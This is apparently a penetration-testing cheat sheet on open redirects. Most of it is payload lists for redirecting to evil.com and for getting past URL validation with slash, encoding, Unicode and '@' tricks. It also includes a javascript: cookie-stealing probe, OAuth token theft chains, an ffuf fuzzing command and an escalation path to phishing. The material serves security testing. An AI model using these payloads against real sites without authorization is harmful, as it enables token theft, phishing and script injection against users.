---
tags:
  - high
  - logic
---

# Open Redirect

Open redirects allow attackers to redirect users to malicious domains via trusted URLs. Critical when chained with OAuth for token theft.

## Quick Test

```
?next=https://evil.com
?redirect=//evil.com
?url=http://evil.com
?next=///evil.com
```

## Common Parameters

```
next, url, target, redirect, return_url, returnTo, callback_url, 
redirect_uri, continue, dest, destination, rurl, go, out, view
```

## Attack Vectors

### 1. Basic Redirects

```
?next=https://evil.com
?redirect=//evil.com
?url=http://evil.com
```

### 2. Triple-Slash Bypass

Many validators only check for single slash:

```
https://target.com/login?next=///google.com
```

`///google.com` = `https://google.com`

### 3. Slash/Backslash Combinations

```
//anotherdomain.com/
/\anotherdomain.com/
\\anotherdomain.com\
/\/evil.com
\/evil.com
```

### 4. Protocol Manipulation

**JavaScript injection:**
```
redirect_url=javascript:alert(document.cookie)
```

Bypasses URL validation checking only http/https.

**Non-ASCII authority bypass:**
```
Input:  https://attacker.com%ff@www.target.com  
Output: https://attacker.com?@www.target.com
```

`%ff` converts to `?` after validation.

### 5. Domain Validation Bypasses

**Ideographic Full Stop (U+3002):**
```
Target: https://ddosecrets.com
Bypass: https://ddosecrets%E3%80%82com
```

Unicode `。` bypasses blacklists, browsers normalize to ASCII period.

**Double URL encoding:**
```
Original: https://evil.com
Encoded:  https%253A%252F%252Fevil%252Ecom
```

**Authority manipulation:**
```
https://whatever@www.target.com  → passes validation
https://attacker.com?@www.target.com → after conversion
```

### 6. OAuth Token Theft

**Expired domain purchase:**
```
https://target.com/oauth?redirect=https://expired-domain.com/
```

Whitelisted domain expires → attacker purchases → receives OAuth tokens.

**Callback hijacking:**
```
callback_url=a/../../login?redirect_after_login=https://evil.com
```

Path traversal + fragment preservation leaks OAuth token.

## Bypass Payloads

**Slash variations:**
```
//evil.com
///evil.com
/\/evil.com
\/evil.com
/\evil.com
\\evil.com
```

**Encoding bypasses:**
```
%2f%2fevil.com          # URL encoded //
%252f%252fevil.com      # Double encoded
%09//evil.com           # Tab prefix
%00//evil.com           # Null byte prefix
```

**Unicode bypasses:**
```
evil。com                # Ideographic full stop (U+3002)
evil%E3%80%82com        # URL encoded U+3002
target.com%ff@evil.com  # Non-ASCII authority bypass
```

**Domain tricks:**
```
target.com.evil.com     # Subdomain of attacker
evil.com/target.com     # Path confusion
target.com@evil.com     # Authority confusion
evil.com#target.com     # Fragment confusion
```

**Whitespace/special:**
```
//evil.com%0d%0a        # CRLF
// evil.com             # Space
//evil.com%20           # Encoded space
```

## Real Examples

| Target | Technique | Impact |
|--------|-----------|--------|
| Weblate | `///google.com` triple-slash | Open redirect |
| GitLab Pages | `\\domain\` mixed slash | Redirect |
| Zomato | Token reuse across users | Auth bypass |
| Periscope | Path traversal + fragment | OAuth theft |
| WordPress | `javascript:` protocol | XSS |
| Twitter | `%ff` non-ASCII | Domain bypass |
| Streamlabs | Expired domain purchase | OAuth token theft |

## Tools

**Parameter discovery:**
```bash
grep -E "(redirect|return|next|url|target|dest|continue)=" urls.txt
ffuf -u "https://target.com/login?FUZZ=https://evil.com" -w redirect_params.txt
```

**Scanner:**
- **OpenRedireX** — https://github.com/devanshbatham/OpenRedireX
- **Caido** — Automate with redirect payloads
- **Gf patterns** — Extract redirect parameters

## Impact Escalation

1. Basic redirect to external domain
2. Chain with OAuth for token theft
3. Chain with SSO for credential theft
4. Chain with login for phishing
5. Use for trusted domain phishing
6. Bypass CSP via trusted redirect
7. Check for javascript: protocol XSS

## Checklist

- [ ] Test basic redirect payloads
- [ ] Try triple-slash bypass (///)
- [ ] Test slash/backslash variations
- [ ] Try URL encoding bypasses
- [ ] Test Unicode characters (U+3002)
- [ ] Check javascript: protocol
- [ ] Test authority manipulation (@)
- [ ] Look for OAuth redirect_uri
- [ ] Check for token reuse
- [ ] Test path traversal in callbacks
